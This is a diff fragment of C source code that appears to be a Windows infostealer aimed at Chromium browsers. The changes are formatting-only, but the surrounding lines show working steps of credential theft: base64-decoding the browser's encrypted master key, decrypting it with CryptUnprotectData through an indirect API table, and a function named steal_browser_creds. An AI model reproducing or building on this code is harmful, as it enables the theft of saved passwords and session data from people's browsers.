@@ -5,6 +5,7 @@
 // clang-format on
 
 #include "chromium.h"
+
 #include <stdint.h>
 #include <stdio.h>
 #include <stdlib.h>
@@ -134,8 +135,8 @@ static int decode_key(PSTR encodedKey, BYTE *decodedKeyOut[],
 
   // Decode the encoded key, this leaves us with an AES-GCM encrypted key
   if (!apis->funcCryptStringToBinaryA(encodedKey, 0, CRYPT_STRING_BASE64,
-                                    decodedBinaryData, &decodedBinarySize, NULL,
-                                    NULL)) {
+                                      decodedBinaryData, &decodedBinarySize,
+                                      NULL, NULL)) {
 #ifdef DEBUG
     fprintf(stderr, "Failed decoding base64. Error code: %lu\n",
             GetLastError());
@@ -174,7 +175,8 @@ static int decrypt_key(BYTE encryptedKey[], size_t encryptedKeySize,
   DataInput.cbData = (DWORD)encryptedKeySize;
   DataInput.pbData = encryptedKey;
 
-  if (!apis->funcCryptUnprotectData(&DataInput, NULL, NULL, NULL, NULL, 0, &DataOutput)) {
+  if (!apis->funcCryptUnprotectData(&DataInput, NULL, NULL, NULL, NULL, 0,
+                                    &DataOutput)) {
 #ifdef DEBUG
     fprintf(stderr, "Failed decrypting key. Error code: %lu\n", GetLastError());
 #endif
@@ -252,16 +254,16 @@ static int steal_browser_creds(BrowserInfo browser, Credential *credTab,
 
   size_t encryptedKeySize = 0;
   BYTE *encryptedKey;
-  if (decode_key(encodedKey, &encryptedKey, &encryptedKeySize,&apis) !=
+  if (decode_key(encodedKey, &encryptedKey, &encryptedKeySize, &apis) !=
       EXIT_SUCCESS) {
 #ifdef DEBUG
     printf("Could not decode %ls\n", encodedKey);
 #endif
     return EXIT_FAILURE;
   }
-  
+
   DATA_BLOB decryptedBlob;
-  if (decrypt_key(encryptedKey, encryptedKeySize, &decryptedBlob,&apis) !=
+  if (decrypt_key(encryptedKey, encryptedKeySize, &decryptedBlob, &apis) !=
       EXIT_SUCCESS) {
 #ifdef DEBUG
     fprintf(stderr, "Could not decrypt key\n");
